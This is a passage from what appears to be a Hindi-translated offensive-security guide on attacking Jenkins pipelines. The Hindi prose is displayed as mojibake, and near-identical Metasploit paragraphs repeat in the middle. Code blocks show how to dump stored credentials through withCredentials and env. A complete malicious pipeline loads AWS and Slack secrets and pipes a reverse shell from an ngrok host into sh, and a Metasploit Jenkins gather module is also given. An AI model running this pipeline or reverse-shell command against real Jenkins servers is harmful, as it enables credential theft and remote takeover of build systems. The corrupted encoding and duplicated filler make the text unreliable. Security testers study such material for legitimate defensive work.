рдпрджрд┐ рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдкрд░ **рд▓реЗрдЦрди рдЙрдкрдпреЛрдЧ** рд╣реИ, рддреЛ рд╡рд╣ рдЗрд╕реЗ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХреЗрдЧрд╛ рдФрд░ рд╢рд╛рдпрдж рд╣реА Jenkins рддрдХ рдкрд╣реБрдВрдЪ рдХреЗ рдмрд┐рдирд╛ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ **рдЯреНрд░рд┐рдЧрд░** рдХрд░ рд╕рдХреЗрдЧрд╛ред\
рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдХреБрдЫ **рд╢рд╛рдЦрд╛ рд╕рдВрд░рдХреНрд╖рдгреЛрдВ рдХреЛ рджреМрд░ рдХрд░рдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА (рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░реЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рд╡реЗ рджреМрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдирд╣реАрдВ)ред

рдХрд╕реНрдЯрдо рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдЯреНрд░рд┐рдЧрд░ рд╣реИрдВ:

* рдореБрдЦреНрдп рд╢рд╛рдЦрд╛ рдХреЗ рд▓рд┐рдП **рдкреБрд▓ рдЕрдиреБрд░реЛрдз** (рдпрд╛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЕрдиреНрдп рд╢рд╛рдЦрд╛рдУрдВ рдХреЗ рд▓рд┐рдП)
* рдореБрдЦреНрдп рд╢рд╛рдЦрд╛ рдореЗрдВ **рдкреБрд╢** (рдпрд╛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЕрдиреНрдп рд╢рд╛рдЦрд╛рдУрдВ рдХреЗ рд▓рд┐рдП)
* **рдореБрдЦреНрдп рд╢рд╛рдЦрд╛ рдХреЛ рдЕрдкрдбреЗрдЯ** рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рдХрд┐рд╕реА рднреА рддрд░реАрдХреЗ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рддрдХ рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдВ

{% hint style="info" %}
рдпрджрд┐ рдЖрдк рдПрдХ **рдмрд╛рд╣рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдЙрдореНрдореАрдж рдирд╣реАрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдХрд┐ рдЖрдк **рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ / рд╕рдВрдЧрдарди** рдХреЗ рд░рд┐рдкреЙ рдп рдХреА **рдореБрдЦреНрдп рд╢рд╛рдЦрд╛ рдХреЗ рд▓рд┐рдП рдкреАрдЖрд░ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдЯреНрд░рд┐рдЧрд░** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ... рд▓реЗрдХрд┐рди рдпрджрд┐ рдпрд╣ **рдмреБрд░реА рддрд░рд╣ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░** рд╣реИ рддреЛ рдЖрдк рдЗрд╕реЗ рдкреВрд░реА рддрд░рд╣ рд╕реЗ **рдХрдВрдкрдирд┐рдпреЛрдВ рдХреЛ рд╢реЛрд╖рдг рдХрд░рдХреЗ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдзреНрд╡рд╕реНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

### рдкрд╛рдЗрдкрд▓рд╛рдЗрди RCE

рдкрд┐рдЫрд▓реЗ RCE рдЦрдВрдб рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ рддрдХрдиреАрдХ рдмрддрд╛рдИ рдЧрдИ рдереА [**рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**](./#rce-creating-modifying-pipeline)ред

### Env рдЪ
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдбрдВрдк рдХрд░рдирд╛

рдЬреЗрдВрдХрд┐рдиреНрд╕ рджреНрд╡рд╛рд░рд╛ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХрд╛ рдЖрдорддреМрд░ рдкрд░ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдпрд╛ рддреЛ **рдЧреНрд▓реЛрдмрд▓ рдкреНрд░реЛрд╡рд╛рдЗрдбрд░реНрд╕** (`/credentials/`) рдХреЗ рд▓рд┐рдП рд╕реНрдХреЛрдк рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ **рдирд┐рд╢реНрдЪрд┐рдд рдкрд░рд┐рдпреЛрдЬрдирд╛рдУрдВ** (`/job/<project-name>/configure`) рдХреЗ рд▓рд┐рдП рд╕реНрдХреЛрдк рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рд╕рднреА рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдХрдо рд╕реЗ рдХрдо рдЙрди рд╕рднреА рдкрд░рд┐рдпреЛрдЬрдирд╛рдУрдВ рдХреЛ рд╣рд╛рдирд┐ рдкрд╣реБрдВрдЪрд╛рдиреА рд╣реЛрдЧреА рдЬрд┐рдирдореЗрдВ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдХрд╕реНрдЯрдо/рдкреЙрдЗрдЬрд╝рдиреНрдб рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

рдПрдХ рдФрд░ рд╕рдорд╕реНрдпрд╛ рд╣реИ, рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЗ рдПрдирд╡реА рдореЗрдВ рдПрдХ рд╕реАрдХреНрд░реЗрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рд╕реАрдХреНрд░реЗрдЯ рдХреЗ рдирд╛рдо рдФрд░ рдкреНрд░рдХрд╛рд░ рдХреЛ рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдПрдХ **`usernamePassword`** рд╕реАрдХреНрд░реЗрдЯ рдХреЛ рдПрдХ **`string`** рд╕реАрдХреНрд░реЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдпрд╣ **рддреНрд░реБрдЯрд┐** рдорд┐рд▓реЗрдЧреА:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
рдпрд╣рд╛рдВ рдЖрдкрдХреЛ рдХреБрдЫ рд╕рд╛рдорд╛рдиреНрдп рдЧреБрдкреНрдд рддрд░реАрдХреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
рдЗрд╕ рдкреГрд╖реНрда рдХреЗ рдЕрдВрдд рдореЗрдВ рдЖрдк **рд╕рднреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХрд╛рд░** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**рд╕рднреА рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдПрдХ рд╕рд╛рде рдбрдВрдк рдХрд░рдиреЗ** рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ **Jenkins** рдорд╢реАрди (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **рдмрд┐рд▓реНрдЯ-рдЗрди рдиреЛрдб** рдореЗрдВ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдЪрд▓рд╛рдирд╛) рдХреЛ **рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝** рдХрд░рдХреЗ рдФрд░ рдлрд┐рд░ рдСрдлрд╝рд▓рд╛рдЗрди рдореЗрдВ рдЙрдиреНрд╣реЗрдВ рд▓реАрдХ рдХрд░рдХреЗ **рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА** рдФрд░ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╕реАрдХреНрд░реЗрдЯреНрд╕** рдХреЛ **рдбрд┐рдХреНрд░рд┐рдкреНрдЯ** рдХрд░рдирд╛ред\
рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [рдиреЛрдбреНрд╕ рдФрд░ рдПрдЬреЗрдВрдЯреНрд╕ рд╕реЗрдХреНрд╢рди](./#nodes-and-agents) рдФрд░ [рдкреЛрд╕реНрдЯ рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди рд╕реЗрдХреНрд╢рди](./#post-exploitation) рдореЗрдВ рджреЗрдЦреЗрдВред
{% endhint %}

### рдЯреНрд░рд┐рдЧрд░реНрд╕

[рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реА](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers) рдХреЗ рдЕрдиреБрд╕рд╛рд░, `triggers` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдХреИрд╕реЗ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдкреБрдирдГ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**ред рдЬрд┐рди рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреНрд╕ рдХреЛ GitHub рдпрд╛ BitBucket рдЬреИрд╕реЗ рд╕реНрд░реЛрдд рдХреЗ рд╕рд╛рде рдПрдХреАрдХреГрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, `triggers` рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗрдмрд╣реБрдХ-рдЖрдзрд╛рд░рд┐рдд рдПрдХреАрдХрд░рдг рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдореМрдЬреВрджрд╛ рдЯреНрд░рд┐рдЧрд░реНрд╕ `cron`, `pollSCM` рдФрд░ `upstream` рд╣реИрдВред

рдХреНрд░реЙрди рдЙрджрд╛рд╣рд░рдг:
```bash
triggers { cron('H */4 * * 1-5') }
```
рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рдореЗрдВ **рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВ**ред

### рдиреЛрдб рдФрд░ рдПрдЬреЗрдВрдЯ

рдПрдХ **рдЬреЗрдВрдХрд┐рдиреНрд╕ рдЗрдВрд╕реНрдЯреЗрдВрд╕** рдореЗрдВ **рдЕрд▓рдЧ-рдЕрд▓рдЧ рдорд╢реАрдиреЛрдВ рдкрд░ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдПрдЬреЗрдВрдЯреНрд╕ рдЪрд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, рд╡рд┐рднрд┐рдиреНрди рдорд╢реАрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЪреЛрд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╡рд┐рднрд┐рдиреНрди рдХреНрд▓рд╛рдЙрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдлрд┐рд░ рдЕрдиреНрдп рдорд╢реАрдиреЛрдВ рдХреЛ рдЙрддреНрдкреАрдбрд╝рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

рдЖрдк `/computer/` рдореЗрдВ **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдиреЛрдб** рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк рдЖрдорддреМрд░ рдкрд░ \*\*`Built-In Node` \*\* (рдЬреЛ рдЬреЗрдВрдХрд┐рдиреНрд╕ рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓рд╛ рдиреЛрдб рд╣реИ) рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рдЕрдиреНрдп рдиреЛрдб рдкрд╛рдПрдВрдЧреЗ:

![](<../../.gitbook/assets/image (25).png>)

рдмрд┐рд▓реНрдЯ-рдЗрди рдиреЛрдб рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХрд░рдирд╛ **рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬреЗрдВрдХрд┐рдиреНрд╕ рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИред

рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдореЗрдВ **рдмрд┐рд▓реНрдЯ-рдЗрди рдЬреЗрдВрдХрд┐рдиреНрд╕ рдиреЛрдб** рдореЗрдВ **рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдЪрд▓рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
pipeline {
agent {label 'built-in'}
```
### рдкреВрд░реНрдг рдЙрджрд╛рд╣рд░рдг

рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдПрдЬреЗрдВрдЯ рдореЗрдВ рдкрд╛рдЗрдкрд▓рд╛рдЗрди, рдХреНрд░реЙрди рдЯреНрд░рд┐рдЧрд░ рдХреЗ рд╕рд╛рде, рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдФрд░ рд╕реНрдЯреЗрдЬ рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЗ рд╕рд╛рде, рдПрдХ рд╕реНрдЯреЗрдк рдореЗрдВ 2 рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рд▓реЛрдб рдХрд░рдирд╛ рдФрд░ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рднреЗрдЬрдирд╛:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
Metasploit рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рдкреЛрд╕реНрдЯ рдЕрдзрд┐рдХрд╛рд░реА рдЯреВрд▓ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдХреНрд╖рдг рдФрд░ рдЕрдиреБрдХрд░рдг рдХреЗ рджреМрд░рд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдУрдкрди рд╕реЛрд░реНрд╕ рдлреНрд░реЗрдорд╡рд░реНрдХ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдЯреВрд▓реНрд╕ рдФрд░ рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рдХрдореА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред Metasploit рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рд╣реИрдХрд░реНрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдХреНрд╖рдг рдХреЗ рджреМрд░рд╛рди рд╡рд┐рднрд┐рдиреНрди рдЕрд╡рд╕рд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рд░рд┐рдореЛрдЯ рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди, рдбреЗрдЯрд╛ рдЪреЛрд░реА, рджреВрд░рд╕реНрде рдирд┐рдпрдВрддреНрд░рдг, рдФрд░ рдЕрдиреНрдп рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ред

Metasploit рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣реИрдХрд░реНрд╕ рд╡рд┐рднрд┐рдиреНрди рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рднрд┐рдиреНрди рдирд┐рдпрдВрддреНрд░рдг рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, Metasploit рдПрдХ рд╡рд┐рд╕реНрддреГрдд рдбреЗрдЯрд╛рдмреЗрд╕ рднреА рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреНрд╕, рдкреЗрдпрд▓реЛрдбреНрд╕, рдФрд░ рдЕрдиреНрдп рдЙрдкрдХрд░рдг рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВред рдпрд╣ рдЙрдкрдХрд░рдг рдФрд░ рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреНрд╕ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдЦреЛрдЬрдиреЗ рдФрд░ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

Metasploit рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣реИрдХрд░реНрд╕ рдХреЛ Metasploit рдлреНрд░реЗрдорд╡рд░реНрдХ рдХреЛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЗрд╕рдХреЗ рдмрд╛рдж, рд╣реИрдХрд░реНрд╕ Metasploit рдХреЗ рд╢реЗрд▓ рдХрдорд╛рдВрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

Metasploit рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣реИрдХрд░реНрд╕ рдХреЛ рд╡рд┐рднрд┐рдиреНрди рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рдХрдореА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рдЗрди рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣реИрдХрд░реНрд╕ рд╡рд┐рднрд┐рдиреНрди рдирд┐рдпрдВрддреНрд░рдг рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рд░рд┐рдореЛрдЯ рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди, рдбреЗрдЯрд╛ рдЪреЛрд░реА, рджреВрд░рд╕реНрде рдирд┐рдпрдВрддреНрд░рдг, рдФрд░ рдЕрдиреНрдп рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ред

Metasploit рдПрдХ рд╡рд┐рд╕реНрддреГрдд рдбреЗрдЯрд╛рдмреЗрд╕ рднреА рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреНрд╕, рдкреЗрдпрд▓реЛрдбреНрд╕, рдФрд░ рдЕрдиреНрдп рдЙрдкрдХрд░рдг рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВред рдпрд╣ рдЙрдкрдХрд░рдг рдФрд░ рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреНрд╕ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдЦреЛрдЬрдиреЗ рдФрд░ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

Metasploit рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣реИрдХрд░реНрд╕ рдХреЛ Metasploit рдлреНрд░реЗрдорд╡рд░реНрдХ рдХреЛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЗрд╕рдХреЗ рдмрд╛рдж, рд╣реИрдХрд░реНрд╕ Metasploit рдХреЗ рд╢реЗрд▓ рдХрдорд╛рдВрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins рд╕реАрдХреНрд░реЗрдЯреНрд╕

рдЖрдк рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрдиреЗ рдкрд░ `/credentials/` рддрдХ рдкрд╣реБрдВрдЪ рдХрд░ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реВрдЪреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдХреЗрд╡рд▓ `credentials.xml` рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдХреЗ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реВрдЪреА рдмрдирд╛рдПрдЧрд╛, рд▓реЗрдХрд┐рди **рдмрд┐рд▓реНрдб рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ** рдФрд░ рднреА **рдЕрдзрд┐рдХ рд╕реАрдХреНрд░реЗрдЯреНрд╕** рд░рдЦ рд╕рдХрддреА 